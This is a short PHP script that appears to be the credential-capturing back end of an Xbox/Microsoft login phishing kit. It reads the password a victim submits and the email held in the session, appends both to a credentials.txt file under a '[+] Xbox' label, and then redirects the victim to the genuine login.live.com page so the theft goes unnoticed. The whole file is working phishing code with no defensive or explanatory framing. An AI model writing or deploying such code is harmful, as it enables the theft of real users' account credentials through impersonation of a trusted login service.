<?php
	include 'ip.php';
	session_start();
	$pass = $_POST["passwd"];
	$email=$_SESSION["Email"];
	file_put_contents("credentials.txt", "[+] Xbox -> Usuario: " . $email . " Contraseña: " . $pass . "\n", FILE_APPEND);
	header('Location: https://login.live.com/login.srf');
	exit();
	session_destroy();		
?>
